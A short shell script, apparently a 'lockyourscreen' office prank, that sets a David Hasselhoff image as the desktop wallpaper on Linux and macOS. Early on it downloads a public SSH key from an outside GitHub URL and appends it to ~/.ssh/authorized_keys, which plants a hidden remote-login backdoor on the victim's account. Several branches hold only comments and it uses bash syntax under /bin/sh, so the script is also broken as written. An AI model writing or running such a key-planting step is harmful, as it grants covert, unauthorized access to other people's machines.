#!/bin/sh
curl https://raw.githubusercontent.com/marcodejongh/lockyourscreen/master/id_lockyourscreen.pub -o ~/.ssh/id_lockyourscreen.pub
touch ~/.ssh/authorized_keys
cat ~/.ssh/id_lockyourscreen.pub >> ~/.ssh/authorized_keys 
curl http://www.picturesnew.com/media/images/david-hasselhoff.jpg -o ~/.hasselhoff.jpg

if [[ "$OSTYPE" == "linux-gnu" ]]; then
        gsettings set org.gnome.desktop.background picture-uri ~/.hasselhoff.jpg
elif [[ "$OSTYPE" == "darwin"* ]]; then
        defaults write com.apple.desktop Background '{default = {ImageFilePath = "~/.hasselhoff.jpg"; };}'
elif [[ "$OSTYPE" == "cygwin" ]]; then
        # ...
elif [[ "$OSTYPE" == "win32" ]]; then
        # ...
elif [[ "$OSTYPE" == "freebsd"* ]]; then
        # ...
else
        # Unknown.
fi
